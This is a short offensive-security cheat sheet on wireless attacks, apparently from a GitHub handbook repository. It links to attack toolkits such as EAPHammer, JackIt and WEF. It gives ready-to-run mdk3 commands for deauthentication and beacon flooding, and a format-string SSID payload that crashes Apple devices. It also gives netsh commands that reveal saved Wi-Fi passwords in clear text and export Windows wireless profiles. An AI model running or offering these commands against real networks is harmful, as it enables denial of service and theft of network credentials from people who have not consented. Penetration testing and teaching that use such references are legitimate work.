# Wireless Attacks

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#Resources)

## Table of Contents

- [airodump-ng](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#airodump-ng)
- [airmon-ng](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#airmon-ng)
- [Apple Wi-Fi Evil SSID](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#Apple-Wi-Fi-Evil-SSID)
- [mdk3](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#mdk3)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| airgeddon | This is a multi-use bash script for Linux systems to audit wireless networks. | https://github.com/v1s1t0r1sh3r3/airgeddon |
| EAPHammer | EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. | https://github.com/s0lst1c3/eaphammer |
| Flipper | Playground (and dump) of stuff I make or modify for the Flipper Zero | https://github.com/UberGuidoZ/Flipper |
| flipperzero-firmware | Flipper Zero Code-Grabber Firmware | https://github.com/Eng1n33r/flipperzero-firmware |
| flipperzero-firmware-wPlugins | Flipper Zero FW [ROGUEMASTER] | https://github.com/RogueMaster/flipperzero-firmware-wPlugins |
| JackIt | JackIt - Exploit Code for Mousejack Resources | https://github.com/insecurityofthings/jackit |
| Pwnagotchi | (⌐■_■) - Deep Reinforcement Learning instrumenting bettercap for WiFi pwning. | https://github.com/evilsocket/pwnagotchi |
| WEF | A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, bluetooth hacking and much more. | https://github.com/D3Ext/WEF |
| Wifite | This repo is a complete re-write of wifite, a Python script for auditing wireless networks. | https://github.com/derv82/wifite2 |

## ALFA AWUS036ACH

```c
$ sudo apt-get install realtek-rtl88xxau-dkms
```

## airodump-ng

```c
$ sudo airodump-ng <INTERFACE>mon
```

## airmon-ng

```c
$ sudo airmon-ng check kill
$ sudo airmon-ng start <INTERFACE>
$ sudo airmon-ng stop <INTERFACE>
```

## Apple Wi-Fi Evil SSID

```c
%p%s%s%s%s%n
```

## mdk3

> https://github.com/charlesxsh/mdk3-master

```c
$ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
$ sudo mdk3 <INTERFACE>mon d <BSSID>
$ sudo mdk3 <INTERFACE>mon b <BSSID>
```

## Microsoft Windows

### Wireless Profiles

#### List Profiles

```c
PS C:\> netsh wlan show profiles
```

#### Extract Passwords

```c
PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
```

#### Export Profiles

```c
PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
```
